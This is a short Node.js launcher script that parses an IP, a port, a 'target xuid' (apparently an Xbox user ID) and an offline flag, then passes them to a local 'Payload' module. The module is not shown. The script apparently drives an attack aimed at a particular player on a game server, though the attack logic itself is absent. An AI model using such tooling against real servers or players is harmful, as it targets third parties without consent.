const Payload = require("./payload.js");

(async () => {
	const ip = process.argv[2];
	const port = Number(process.argv[3]);
	const targetXuid = process.argv[4];
	const offline = !!process.argv[5];

	if(!ip || !port || !targetXuid || !port || port < 1024) {
		console.error("Improper usage, please follow this format:\nnode . <ip> <port> <target xuid> [offline]");
		process.exit(0);
	}

	new Payload({ targetXuid, ip, port, offline });
})();